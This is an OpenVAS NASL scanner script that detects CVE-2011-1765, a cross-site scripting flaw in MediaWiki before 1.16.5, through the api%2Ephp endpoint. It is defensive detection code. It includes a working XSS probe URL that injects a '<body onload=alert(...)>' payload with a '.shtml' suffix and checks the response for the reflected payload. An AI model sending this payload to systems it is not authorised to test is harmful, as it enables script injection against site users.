##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mediawiki_xss_vuln.nasl 13226 2019-01-22 14:27:13Z cfischer $
#
# MediaWiki Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902380");
  script_version("$Revision: 13226 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 15:27:13 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-06-02 11:54:09 +0200 (Thu, 02 Jun 2011)");
  script_cve_id("CVE-2011-1765");
  script_bugtraq_id(47722);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("MediaWiki Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_mediawiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mediawiki/installed");

  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=702512");
  script_xref(name:"URL", value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=28534");
  script_xref(name:"URL", value:"http://lists.wikimedia.org/pipermail/mediawiki-announce/2011-May/000098.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"MediaWiki version before 1.16.5.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling the file extension such as
  '.shtml' at the end of the query string, along with URI containing a
  '%2E' sequence in place of the .(dot) character.");

  script_tag(name:"solution", value:"Upgrade to MediaWiki 1.16.5 or later.");

  script_tag(name:"summary", value:"This host is running MediaWiki and is prone to cross site scripting
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit(0);
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/api%2Ephp?action=query&meta=siteinfo&format=json&siprop=%3Cbody%20onload=alert('document.cookie')%3E.shtml";

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( res !~ "^HTTP/1\.[01] 200" ) exit( 99 );

if( "Invalid file extension found in PATH_INFO or QUERY_STRING." >!< res &&
    "<body onload=alert('document.cookie')>.shtml" >< res &&
    "Status: 403 Forbidden" >!< res ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );